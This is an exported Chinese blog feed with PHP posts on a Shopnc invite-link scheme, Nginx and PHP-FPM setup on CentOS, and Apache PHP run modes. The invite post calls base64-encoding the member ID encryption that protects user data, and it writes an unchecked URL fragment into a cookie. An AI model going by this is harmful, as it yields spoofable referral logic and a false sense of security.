<p>本文代码来自 <span class="exturl" data-url="aHR0cDovL3d3dy5ydW5vb2IuY29tL3BocC9waHAtcmVzdGZ1bC5odG1s">W3C 菜鸟教程<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title>Shopnc 奇妙的邀请机制</title>
    <url>/2018/11/php-shopnc/</url>
    <content><![CDATA[<h2 id="首先参考，URL-中-“-”-“？”-“”-号的作用"><a href="#首先参考，URL-中-“-”-“？”-“”-号的作用" class="headerlink" title="首先参考，URL 中 “#” “？” &amp;“” 号的作用"></a>首先参考，URL 中 “#” “？” &amp;“” 号的作用</h2><p>场景 用户登录后邀请好友返利，被邀请用户打开好友发送的邀请链接访问，进行注册后给邀请好友增加积分，就算被邀请用户切换页面，网站也能判断邀请用户是谁。</p>
<span id="more"></span>

<h2 id="1-邀请链接-代码块"><a href="#1-邀请链接-代码块" class="headerlink" title="(1) 邀请链接 代码块"></a>(1) 邀请链接 代码块</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="variable">$member_id</span> = base64_encode(intval(<span class="variable">$_SESSION</span>[<span class="string">&#x27;member_id&#x27;</span>])*<span class="number">1</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-访问链接-代码块"><a href="#2-访问链接-代码块" class="headerlink" title="(2) 访问链接 代码块"></a>(2) 访问链接 代码块</h2><p>由于切换页面也能找出邀请用户是谁，需要使用 cookie</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uid = <span class="built_in">window</span>.location.href.split(<span class="string">&quot;#V5&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fragment = uid[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(fragment)&#123;</span><br><span class="line">    <span class="keyword">if</span> (fragment.indexOf(<span class="string">&quot;V5&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">document</span>.cookie=<span class="string">&#x27;uid=0&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">document</span>.cookie=<span class="string">&#x27;uid=&#x27;</span>+uid[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能实现随便切换页面只要不清空 cookie 的情况下找出邀请人，而且加密邀请人 ID，保护用户信息安全。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Shopnc</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos 下配置 Nginx 支持 Php</title>
    <url>/2017/05/centos-nginx-php/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h2 id="添加-nginx-默认主页-index-php"><a href="#添加-nginx-默认主页-index-php" class="headerlink" title="添加 nginx 默认主页 index.php"></a>添加 nginx 默认主页 index.php</h2><p>使用命令 <code>vim /etc/nginx/conf.d/default.conf</code></p>
<span id="more"></span>

<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">location</span> / &#123;</span><br><span class="line">    root   /usr/<span class="keyword">share</span>/nginx/html;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">index</span>  <span class="keyword">index</span>.html <span class="keyword">index</span>.htm <span class="keyword">index</span>.php;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="配置-nginx-支持-php"><a href="#配置-nginx-支持-php" class="headerlink" title="配置 nginx 支持 php"></a>配置 nginx 支持 php</h2><p>使用命令 <code>vim /etc/nginx/conf.d/default.conf</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line"><span class="section">location</span> <span class="regexp">~ .php$</span> &#123;</span><br><span class="line">    <span class="attribute">root</span>           html;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  /usr/share/nginx/html<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="配置-php-fpm"><a href="#配置-php-fpm" class="headerlink" title="配置 php-fpm"></a>配置 php-fpm</h2><p>使用命令 <code>vim /etc/php-fpm.d/www.conf</code></p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">; Unix user/<span class="keyword">group</span> <span class="title">of</span> processes</span><br><span class="line">; Note: The <span class="keyword">user</span> <span class="title">is</span> mandatory. If the <span class="keyword">group</span> <span class="title">is</span> not set, the default user&#x27;s <span class="keyword">group</span></span><br><span class="line"><span class="title">;       will</span> be used.</span><br><span class="line">; RPM: apache Choosed to be able to access some dir as httpd</span><br><span class="line"></span><br><span class="line"><span class="keyword">user</span> <span class="title">= nginx</span></span><br><span class="line"></span><br><span class="line">; RPM: Keep a <span class="keyword">group</span> <span class="title">allowed</span> to <span class="keyword">write</span> <span class="keyword">in</span> log dir.</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="title">= nginx</span></span><br><span class="line"></span><br><span class="line">chkconfig php-fpm on    <span class="comment"># 设置 php-fpm 自启动</span></span><br><span class="line"></span><br><span class="line">chkconfig mysqld on     <span class="comment">#设置 mysqld 自启动</span></span><br><span class="line"></span><br><span class="line">service nginx restart   <span class="comment">#重新启动 nginx</span></span><br><span class="line"></span><br><span class="line">service php-fpm <span class="literal">start</span>   <span class="comment">#启动 php-fpm</span></span><br><span class="line"></span><br><span class="line">service mysqld <span class="literal">start</span>    <span class="comment"># 启动 mysqld</span></span><br></pre></td></tr></table></figure>

<p>对很多人而言，配置 Nginx+PHP 无外乎就是搜索一篇教程，然后拷贝粘贴。听上去似乎也没什么问题，可惜实际上网络上很多资料本身年久失修，漏洞百出，如果大家不求甚解，一味的拷贝粘贴，早晚有一天会为此付出代价。</p>
<p>假设我们用 PHP 实现了一个前端控制器，或者直白点说就是统一入口：把 PHP 请求都发送到同一个文件上，然后在此文件里通过解析「REQUEST_URI」实现路由。</p>
<h2 id="此时很多教程会教大家这样配置-Nginx-PHP："><a href="#此时很多教程会教大家这样配置-Nginx-PHP：" class="headerlink" title="此时很多教程会教大家这样配置 Nginx+PHP："></a>此时很多教程会教大家这样配置 Nginx+PHP：</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> foo.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /path;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">index</span> index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">if</span> (!-e <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">            <span class="attribute">rewrite</span> . /index.php <span class="literal">last</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME /path<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面有很多错误，或者说至少是坏味道的地方，大家看看能发现几个。</p>
<p>我们有必要先了解一下 Nginx 配置文件里指令的继承关系：Nginx 配置文件分为好多块，常见的从外到内依次是「http」、「server」、「location」等等，缺省的继承关系是从外到内，也就是说内层块会自动获取外层块的值作为缺省值（有例外）。</p>
<p>让我们先从「index」指令入手吧，在问题配置中它是在「location」中定义的：</p>
<figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">location</span> / &#123;</span><br><span class="line">    <span class="keyword">index</span> <span class="keyword">index</span>.html <span class="keyword">index</span>.htm <span class="keyword">index</span>.php;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦未来需要加入新的「location」，必然会出现重复定义的「index」指令，这是因为多个「location」是平级的关系，不存在继承，此时应该在「server」里定义「index」，借助继承关系，「index」指令在所有的「location」中都能生效。</p>
<p>接下来看看「if」指令，说它是大家误解最深的 Nginx 指令毫不为过：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">if</span> (!-e <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">    <span class="attribute">rewrite</span> . /index.php <span class="literal">last</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很多人喜欢用「if」指令做一系列的检查，不过这实际上是「try_files」指令的职责：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">try_files <span class="variable">$uri</span> <span class="variable">$uri</span><span class="regexp">/ /i</span>ndex.php;</span><br></pre></td></tr></table></figure>

<p>除此以外，初学者往往会认为「if」指令是内核级的指令，但是实际上它是 rewrite 模块的一部分，加上 Nginx 配置实际上是声明式的，而非过程式的，所以当其和非 rewrite 模块的指令混用时，结果可能会非你所愿。</p>
<p>下面看看「fastcgi_params」配置文件：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">include fastcgi_params<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>Nginx 有两份 fastcgi 配置文件，分别是「fastcgi_params」和「fastcgi.conf」，它们没有太大的差异，唯一的区别是后者比前者多了一行「SCRIPT_FILENAME」的定义：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br></pre></td></tr></table></figure>

<p>注意：$document_root 和 $fastcgi_script_name 之间没有 &#x2F;。</p>
<p>原本 Nginx 只有「fastcgi_params」，后来发现很多人在定义「SCRIPT_FILENAME」时使用了硬编码的方式，于是为了规范用法便引入了「fastcgi.conf」。</p>
<p>不过这样的话就产生一个疑问：为什么一定要引入一个新的配置文件，而不是修改旧的配置文件？这是因为「fastcgi_param」指令是数组型的，和普通指令相同的是：内层替换外层；和普通指令不同的是：当在同级多次使用的时候，是新增而不是替换。换句话说，如果在同级定义两次「SCRIPT_FILENAME」，那么它们都会被发送到后端，这可能会导致一些潜在的问题，为了避免此类情况，便引入了一个新的配置文件。</p>
<p>此外，我们还需要考虑一个安全问题：在 PHP 开启「cgi.fix_pathinfo」的情况下，PHP 可能会把错误的文件类型当作 PHP 文件来解析。如果 Nginx 和 PHP 安装在同一台服务器上的话，那么最简单的解决方法是用「try_files」指令做一次过滤：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br></pre></td></tr></table></figure>

<p>依照前面的分析，给出一份改良后的版本，是不是比开始的版本清爽了很多：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> foo.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /path;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">include</span> fastcgi.conf;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上还有一些瑕疵，主要是「try_files」和「fastcgi_split_path_info」不够兼容，虽然能够解决，但方案比较丑陋，具体就不多说了，有兴趣的可以参考问题描述。</p>
<p>补充：因为「location」已经做了限定，所以「fastcgi_index」其实也没有必要。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>Apache 运行 Php 的几种方式</title>
    <url>/2017/05/apache-php/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>apache php的几种运行方式, by 5lulu.com</p>
<p>PHP 的所有应用程序都是通过 WEB 服务器 (如 IIS 或 Apache) 和 PHP 引擎程序解释执行完成的，</p>
<span id="more"></span>


<h2 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h2><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(1)</span> 当用户在浏览器地址中输入要访问的 PHP 页面文件名，然后回车就会触发这个 PHP 请求，并将请求传送化支持 PHP 的 WEB 服务器。</span><br><span class="line"><span class="comment">(2)</span> WEB 服务器接受这个请求，并根据其后缀进行判断如果是一个 PHP 请求，WEB 服务器从硬盘或内存中取出用户要访问的 PHP 应用程序，并将其发送给 PHP 引擎程序。</span><br><span class="line"><span class="comment">(3)</span> PHP 引擎程序将会对 WEB 服务器传送过来的文件从头到尾进行扫描并根据命令从后台读取，处理数据，并动态地生成相应的 HTML 页面。</span><br><span class="line"><span class="comment">(4)</span> PHP 引擎将生成 HTML 页面返回给 WEB 服务器。WEB 服务器再将 HTML 页面返回给客户端浏览器。</span><br></pre></td></tr></table></figure>

<p>php 本身是一个 php 代码的脚本执行程序，运行方式是指其运行的方法。整理归纳为一下五种方法：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">模块加载运行方式 （Apache）</span><br><span class="line">CGI 运行方式 （Apache）</span><br><span class="line">FastCGI 运行方式 （几乎通用 Apache nginx lighttp）</span><br><span class="line">ISAPI 运行方式 （<span class="keyword">window</span> 下 Apache）</span><br><span class="line"><span class="keyword">cli</span> 运行方式 （就是命令行）</span><br></pre></td></tr></table></figure>

<p>前四种是提供给 web 服务器来处理 php 代码文件，其中模块加载的方式其实是最快的的，但 FastCGI 配合 nginx WEB 服务是目前的主流，下面主要配合 Apache 做说明。</p>
<h4 id="1-模块加载运行方式"><a href="#1-模块加载运行方式" class="headerlink" title="1 模块加载运行方式"></a>1 模块加载运行方式</h4><p>以模块加载的方式运行，其实就是将 PHP 集成到 web 服务器，以同一个进程运行。</p>
<p>此运行模式在使用 apache 服务器经常使用，通过加载模块 (linux SO,window DLL) 中，PHP 是与 Web 服务器 (Apache) 一起启动并运行的，是 apache 在 CGI 的基础上进行的一种扩展，加快 PHP 的运行效率。</p>
<p>以 linux 为例编译 PHP, 在.&#x2F;configure 步骤需要指定 –with-apxs2&#x3D;&#x2F;path&#x2F;to&#x2F;apache&#x2F;bin&#x2F;apxs 表示告诉编译器通过 Apache 的 mod_php5&#x2F;apxs 来提供对 PHP5 的解析。</p>
<p>在 make install 的时候我们会看到将动态链接库 libphp5.so (Apache 模块) 拷贝到 apache2 的安装目录的 modules 目录下（编译 Apache 时要带 –enable-modules&#x3D;so，不实际编译模块但允许加载模块），然后在 httpd.conf 配置文件中添加 LoadModule 语句来动态将 libphp5.so 模块加载进来，从而实现 Apache 对 php 的支持。</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">LoadModule php5_module /path/<span class="keyword">to</span>/<span class="keyword">module</span>/modules/libphp5.so<span class="comment">//windows 下载 PHP 一般为 php5apache2_2.dll PHPinidir &quot;/path/to/php.ini&quot;</span></span><br><span class="line">DirectoryIndex <span class="keyword">index</span>.html <span class="keyword">index</span>.php</span><br><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>

<p>PHP 作为 Apache 模块，Apache 服务器在系统启动后，预先生成多个进程副本驻留在内存中，一旦有请求出现，就立即使用这些空余的子进程进行处理，这样就不存在生成子进程造成的延迟了。这些服务器副本在处理完一次 HTTP 请求之后并不立即退出，而是停留在计算机中等待下次请求。对于客户浏览器的请求反应更快，性能较高。</p>
<h4 id="2-CGI-运行方式"><a href="#2-CGI-运行方式" class="headerlink" title="2 CGI 运行方式"></a>2 CGI 运行方式</h4><p>CGI 即通用网关接口 (Common Gateway Interface)，它是一段程序，通俗的讲 CGI 就象是一座桥，把网页和 WEB 服务器中的执行程序连接起来，它把 HTML 接收的指令传递给服务器的执行程序，再把服务器执行程序的结果返还给 HTML 页。CGI 的跨平台性能极佳，几乎可以在任何操作系统上实现。</p>
<p>CGI 方式在遇到连接请求（用户 请求）先要创建 cgi 的子进程，激活一个 CGI 进程，然后处理请求，处理完后结束这个子进程。这就是 fork-and-execute 模式。所以用 cgi 方式的服务器有多少连接请求就会有多少 cgi 子进程，子进程反复加载是 cgi 性能低下的主要原因。都会当用户请求数量非常多时，会大量挤占系统的资源如内 存，CPU 时间等，造成效能低下。</p>
<p>修改 PHP 配置 php.ini</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cgi</span>.force_redirect = <span class="number">0</span> // 本来是 <span class="number">1</span> 并且去掉注释符号；</span><br></pre></td></tr></table></figure>

<p>修改 apache 的配置，去掉原来的模块配置</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .php</span><br><span class="line"><span class="attribute">LoadModule</span> php5_module <span class="string">&quot;C:/php5/php5apache2_2.dll&quot;</span></span><br><span class="line"><span class="attribute">PHPinidir</span> <span class="string">&quot;C:/php5/php.ini&quot;</span></span><br></pre></td></tr></table></figure>

<p>加入以下配置</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddHandler cgi-<span class="keyword">script</span></span><br></pre></td></tr></table></figure>

<p>然后在网站 cgi-bin 目录下新建一个 cgi 文件 test.cgi 编写如下代码：</p>
<figure class="highlight d"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/path/to/php/php-cgi(.exe)</span></span><br><span class="line">&lt;?</span><br><span class="line">php php phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在上述情况中，你可以想象 CGI 通常有多慢。每一个 Web 请求 PHP 都必须重新解析 php.ini、重新载入全部扩展并重初始化全部数据结构。</p>
<h4 id="3-FastCGI-运行方式"><a href="#3-FastCGI-运行方式" class="headerlink" title="3 FastCGI 运行方式"></a>3 FastCGI 运行方式</h4><p>fast-cgi 是 cgi 的升级版本，FastCGI 像是一个常驻 (long-live) 型的 CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去 fork 一 次。PHP 使用 PHP-FPM (FastCGI Process Manager)，全称 PHP FastCGI 进程管理器进行管理。</p>
<p>php 5.3.29 之后自带 FPM，编译时带 –enable-fpm，之前需另外加载模块。</p>
<p>PHP 的 fastcig 方式运行，如果是 Apache 服务器首先需要去下载 fastcgi 模块，默认是没有带这个模块的，而 cgi 是自带的；下载地址 <span class="exturl" data-url="aHR0cDovL2h0dHBkLmFwYWNoZS5vcmcvbW9kX2ZjZ2lkLyVFRiVCQyU5QiVFOCVBNyVBMyVFNSU4RSU4QiVFNSVBNCU4RCVFNSU4OCVCNiVFNSU4NSVCNiVFNCVCOCVBRCVFNyU5QSU4NA==">http://httpd.apache.org/mod_fcgid/；解压复制其中的<i class="fa fa-external-link-alt"></i></span> mod_fcgid.so 和 mod_fcgid.pdb，接下来做如下的配置：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">LoadModule fcgid_module modules/mod_fcgid.so//<span class="type">line</span> <span class="number">128</span> 追加</span><br><span class="line">FcgidInitialEnv PHPRC &quot;c:/php5&quot; //php 配置文件 <span class="type">line</span> <span class="number">129</span> 追加 AddHandler</span><br><span class="line">fcgid-script .php// 添加句柄 即后缀 什么样的文件需要 fastcgi 解释 <span class="type">line</span> <span class="number">407</span> 追加 FcgidWrapper</span><br><span class="line">&quot;c:/php5/php-cgi.exe&quot; .php// 解释器路径 <span class="type">line</span> <span class="number">408</span> <span class="keyword">Options</span> Indexes</span><br><span class="line">FollowSymLinks ExecCGI //<span class="type">line</span> <span class="number">221</span> 追加 ExecCGI 意思是目录允许执行 CGI 脚本</span><br></pre></td></tr></table></figure>

<p>使用 FastCGI，所有这些都只在进程启动时发生一次。一个额外的 好处是，持续数据库连接 (Persistent database connection) 可以工作。</p>
<h4 id="4-ISAPI-运行方式"><a href="#4-ISAPI-运行方式" class="headerlink" title="4 ISAPI 运行方式"></a>4 ISAPI 运行方式</h4><p>ISAPI 即 Internet Server Application Program Interface，是微软提供的一套面向 Internet 服务的 API 接口，一个 ISAPI 的 DLL，可以在被用户请求激活后长驻内存，等待用户的另一个请求，还可以在一个 DLL 里设置多个用户请求处理函数，此外，ISAPI 的 DLL 应用程序和 WWW 服务器处于同一个进程中，效率要显著高于 CGI。（由于微软的排他性，只能运行于 windows 环境)</p>
<h4 id="5-cli-运行方式"><a href="#5-cli-运行方式" class="headerlink" title="5 cli 运行方式"></a>5 cli 运行方式</h4><p>cli 是 php 的命令行运行模式，大家经常会使用它，但是可能并没有注意到（例如：我们在 linux 下经常使用 “php -m” 查找 PHP 安装了那些扩展就是 PHP 命令行运行模式；有兴趣的同学可以输入 php -h 去深入研究该运行模式）</p>
<p>一。可以配置 Apache 将 PHP 解释器作为 CGI 脚本，或者作为 Apache 本身的一个模块 (mod_php)，还有就是 FastCGI 模式来运行。</p>
<p>CGI 是比较原始的方式，Apache 默认是以第二种方式运行 PHP 的，而配置 FastCGI 模式需要下载安装相关的包。</p>
<p>性能上，CGI 模式每一次接到请求会调用 php.exe，解析 php.ini，加载 DLL 等，速度自然慢。</p>
<p>后两种方式会在 Web 程序启动时就作为启动，等待请求；其中 FastCGI 下，实现了类似连接池的技术特性，保持了对后台的连接，请求到来即可使用，结束即断开准备与下一个请求连接。</p>
<p>实际中，有人认为 FastCGI 比 mod_php 模式慢，有认为前者是后者性能的 80% 的，还有人测试后认为：对于匿名访问，前者约为后者性能的 63%，认证访问时也低了 18%。一般认为，FastCGI 是适用于高并发使用场景下的，同时使用 FastCGI 可以使得程序在 Web Server 产品与代码两端都具有更好的选择自由度。 </p>
<p>二。Nginx 默认不支持 CGI 模式，它是以 FastCGI 方式运行的。所以使用 Nginx+PHP 就是直接配置为 FastCGI 模式。</p>
<p>For the most part, lack of CGI support in Nginx is not an issue and actually has an important side-benefit: because Nginx cannot directly execute external programs (CGI), a malicious person can’t trick your system into uploading and executing an arbitrary script. </p>
<h2 id="php-在-apache-中一共有三种工作方式：CGI-模式、Apache-模块-DLL、FastCGI-模式"><a href="#php-在-apache-中一共有三种工作方式：CGI-模式、Apache-模块-DLL、FastCGI-模式" class="headerlink" title="php 在 apache 中一共有三种工作方式：CGI 模式、Apache 模块 DLL、FastCGI 模式)"></a>php 在 apache 中一共有三种工作方式：CGI 模式、Apache 模块 DLL、FastCGI 模式)</h2><p>以下分别比较：</p>
<h4 id="1-CGI-模式与模块模式比较："><a href="#1-CGI-模式与模块模式比较：" class="headerlink" title="1. CGI 模式与模块模式比较："></a>1. CGI 模式与模块模式比较：</h4><p>php 在 apache 中两种工作方式的区别 (CGI 模式、Apache 模块 DLL)</p>
<p>这两种工作方式的安装：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PHP</span> 在 Apache <span class="number">2</span>.<span class="number">0</span> 中的 CGI 方式</span><br><span class="line"><span class="attribute">ScriptAlias</span> /php/ <span class="string">&quot;c:/php/&quot;</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对 PHP 4 用这行</span></span><br><span class="line"><span class="attribute">Action</span> application/x-httpd-php <span class="string">&quot;/php/php.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对 PHP 5 用这行</span></span><br><span class="line"><span class="attribute">Action</span> application/x-httpd-php <span class="string">&quot;/php/php-cgi.exe&quot;</span></span><br><span class="line"><span class="attribute">PHP</span> 在 Apache <span class="number">2</span>.<span class="number">0</span> 中的模块方式</span><br><span class="line"><span class="comment"># 对 PHP 4 用这两行：</span></span><br><span class="line"><span class="attribute">LoadModule</span> php4_module <span class="string">&quot;c:/php/php4apache2.dll&quot;</span></span><br><span class="line"><span class="comment"># 别忘了从 sapi 目录中把 php4apache2.dll 拷贝出来！</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .php</span><br><span class="line"><span class="comment"># 对 PHP 5 用这两行：</span></span><br><span class="line"><span class="attribute">LoadModule</span> php5_module <span class="string">&quot;c:/php/php5apache2.dll&quot;</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 php.ini 的路径</span></span><br><span class="line"><span class="attribute">PHPIniDir</span> <span class="string">&quot;C:/php&quot;</span></span><br></pre></td></tr></table></figure>

<p>这两种工作方式的区别：</p>
<figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line">在 <span class="built_in">CGI</span> 模式下，如果客户机请求一个 php 文件，Web 服务器就调用 php.exe 去解释这个文件，然后再把解释的结果以网页的形式返回给客户机；</span><br><span class="line">而在模块化 (DLL) 中，PHP 是与 Web 服务器一起启动并运行的。</span><br><span class="line">所以从某种角度上来说，以 apache 模块方式安装的 PHP4 有着比 <span class="built_in">CGI</span> 模式更好的安全性以及更好的执行效率和速度。</span><br></pre></td></tr></table></figure>

<h4 id="2-FastCGI-运行模式分析："><a href="#2-FastCGI-运行模式分析：" class="headerlink" title="2. FastCGI 运行模式分析："></a>2. FastCGI 运行模式分析：</h4><p>FastCGI 的工作原理是：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(1)</span>、Web Server 启动时载入 FastCGI 进程管理器【PHP 的 FastCGI 进程管理器是 PHP-FPM <span class="comment">(php-FastCGI Process Manager)</span>】（IIS ISAPI 或 Apache Module);</span><br><span class="line"><span class="comment">(2)</span>、FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程 <span class="comment">(在任务管理器中可见多个 php-cgi.exe)</span> 并等待来自 Web Server 的连接。</span><br><span class="line"><span class="comment">(3)</span>、当客户端请求到达 Web Server 时，FastCGI 进程管理器选择并连接到一个 CGI 解释器。Web server 将 CGI 环境变量和标准输入发送到 FastCGI 子进程 php-cgi.exe。 </span><br><span class="line"><span class="comment">(4)</span>、FastCGI 子进程完成处理后将标准输出和错误信息从同一连接返回 Web Server。当 FastCGI 子进程关闭连接时，请求便告处理完成。FastCGI 子进程接着等待并处理来自 FastCGI 进程管理器（运行在 WebServer 中）的下一个连接。 在正常的 CGI 模式中，php-cgi.exe 在此便退出了。</span><br></pre></td></tr></table></figure>

<p>在上述情况中，你可以想象 CGI 通常有多慢。每一个 Web 请求 PHP 都必须重新解析 php.ini、重新载入全部 dll 扩展并重初始化全部数据结构。使用 FastCGI，所有这些 都只在进程启动时发生一次。一个额外的好处是，持续数据库连接 (Persistent database connection) 可以工作。 </p>
<h4 id="3-为什么要使用-FastCGI，而不是多线程-CGI-解释器？"><a href="#3-为什么要使用-FastCGI，而不是多线程-CGI-解释器？" class="headerlink" title="3. 为什么要使用 FastCGI，而不是多线程 CGI 解释器？"></a>3. 为什么要使用 FastCGI，而不是多线程 CGI 解释器？</h4><p>这可能出于多方面的考虑，例如：</p>
<figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)、你无论如何也不能在 windows 平台上稳定的使用多线程 <span class="built_in">CGI</span> 解释器，无论是 IIS ISAPI 方式还是 APACHE Module 方式，它们总是运行一段时间就崩溃了。奇怪么？但是确实存在这样的情况！</span><br><span class="line">当然，也有很多时候你能够稳定的使用多线程 <span class="built_in">CGI</span> 解释器，但是，你有可能发现网页有时候会出现错误，无论如何也找不到原因，而换用 FastCGI 方式 时这种错误的概率会大大的降低。我也不清楚这是为什么，我想独立地址空间的 <span class="built_in">CGI</span> 解释器可能终究比共享地址空间的形式来得稳定一点点。</span><br><span class="line">(<span class="number">2</span>)、性能！性能？可能么，难道 FastCGI 比多线程 <span class="built_in">CGI</span> 解释器更快？但有时候确实是这样，只有测试一下你的网站，才能最后下结论。原因嘛，我觉得 很难讲，但有资料说在 Zend WinEnabler 的时代，Zend 原来也是建议在 Windows 平台下使用 FastCGI 而不是 IIS ISAPI 或 Apache Module，不过现在 Zend 已经不做这个产品了。 </span><br></pre></td></tr></table></figure>

